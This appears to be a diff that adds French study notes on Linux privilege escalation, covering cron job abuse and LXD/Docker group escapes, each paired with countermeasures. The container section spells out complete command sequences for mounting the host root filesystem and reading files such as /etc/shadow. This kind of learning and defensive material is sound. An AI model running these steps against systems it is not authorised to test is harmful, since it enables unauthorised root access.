@@ -791,3 +791,104 @@ Identifier vite les **Linux capabilities** attribuées aux binaires, comprendre 
 ## 8) Ressource utile
 - [getcap / setcap (man)](https://man7.org/linux/man-pages/man8/setcap.8.html)  
 
+---
+# Service-based Privilege Escalation
+
+---
+
+# Cron Job Abuse
+
+## Objectif
+Repérer rapidement des tâches cron ou scripts écrits par root mais modifiables par un utilisateur non-privilégié, et exploiter-les pour obtenir une élévation de privilèges locale (root).
+
+## 1) Détection rapide
+- Trouver fichiers/crons world-writable : `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`  
+- Lister crontabs système : `ls -la /etc/cron.* /var/spool/cron*`  
+- Rechercher scripts modifiables référencés par cron : `grep -R --line-number "cron" /etc/cron* 2>/dev/null`  
+- Observer exécution réelle (sans root) : utiliser `pspy` (ex : `./pspy64 -pf -i 1000`) pour voir jobs lancés et fréquences.
+
+## 2) Vérifier fréquence & propriétaire
+- Si un script s'exécute en root souvent (ex. chaque minute / toutes les 3 min), il est idéal pour injecter un payload rapide.
+
+## 3) Contremesures
+- Retirer write sur scripts critiques : `chmod o-w /path/to/script`  
+- Restreindre dossiers contenant crons : `chown root:root` + `chmod 750`  
+- Éviter `cron` jobs qui exécutent scripts depuis dossiers écrits par non-root.  
+- Auditer et corriger crontabs dans `/etc/cron.d`, `/etc/cron.daily`, `/var/spool/cron` — désactiver / corriger entrées vulnérables.  
+- Déployer `auditd`/logging sur modifications de scripts cron.
+
+## 4) Bonnes pratiques pour les admins
+- Ne jamais laisser scripts root world-writable.  
+- Utiliser chemins absolus dans scripts et vérifier entrées externes.  
+- Monter `/tmp` et dossiers temporaires avec `noexec,nosuid,nodev` si possible.  
+- Minimiser les tâches root fréquentes ; privilégier comptes dédiés.
+
+## Ressource (outil)
+- [pspy](https://github.com/DominicBreuker/pspy) : observer cron/processus sans root.  
+
+---
+
+# Containers
+
+## Principe
+Les containers (LXC/LXD, Docker) partagent le noyau hôte. Si un utilisateur appartient au groupe `lxd`/`docker`, il peut créer des conteneurs **privileged** et monter le système hôte — accès root possible.
+
+## 1) Détection rapide
+- Vérifier groupes : `id`  
+  → si `lxd` ou `docker` présent, c’est critique.
+- Voir images/templates locales : `ls ~/ContainerImages` ou `lxc image list`
+
+## 2) Exploitation rapide (LXD)
+1. Importer une image (si dispo) :  
+   `lxc image import alpine.tar.gz --alias alpine`  
+2. Initialiser un container *privileged* :  
+   `lxc init alpine privesc -c security.privileged=true`  
+3. Monter la racine hôte dans le container :  
+   `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`  
+4. Démarrer et exécuter un shell :  
+   `lxc start privesc`  
+   `lxc exec privesc -- /bin/bash`  ou `/bin/sh` pour alpine
+5. Dans le container : accéder au host via `/mnt/root` (root sur l’hôte).
+
+## 3) Exploitation rapide (Docker)
+- Si membre du groupe `docker` : lancer un conteneur avec volume du host :
+  `docker run -v /:/mnt --rm -it ubuntu /bin/bash`  
+- Puis explorer `/mnt` pour récupérer clefs, `/etc/shadow`, etc.
+
+## 4) Bonnes pratiques & contremesures
+- Ne jamais ajouter d’utilisateurs non fiables aux groupes `lxd`/`docker`.
+- Restreindre accès LXD : activer socket TLS + contrôle d’accès.
+- Désactiver `security.privileged` par défaut ; utiliser profiles restreints.
+- Sur Docker, limiter capacités, désactiver montage de volumes sensibles, utiliser seccomp et AppArmor.
+- Auditer images/templates locales (pas d’images non signées).
+- Surveillance/logging des créations d’images/containers.
+
+## 5) Signes d’alerte à surveiller
+- Existence d’images locales non officielles (`lxc image list`, `docker images`).
+- Fichiers template avec mots de passe ou ssh keys dans `~/ContainerImages` ou dossiers partagés.
+- Groupes `lxd` / `docker` dans `/etc/group`.
+
+---
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
